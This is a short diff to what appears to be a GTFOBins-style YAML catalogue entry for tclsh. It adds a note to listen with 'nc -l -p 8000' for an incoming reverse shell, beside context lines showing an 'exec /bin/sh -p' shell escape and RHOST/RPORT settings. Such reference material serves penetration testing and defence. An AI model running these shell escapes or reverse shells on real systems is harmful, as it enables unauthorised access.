@@ -13,7 +13,7 @@ functions:
         ./tclsh
         exec /bin/sh -p <@stdin >@stdout 2>@stderr
   reverse-shell:
-    - description:
+    - description: Run `nc -l -p 8000` to receive the shell on the other end.
       code: | 
         export RHOST=10.0.0.1
         export RPORT=8000 
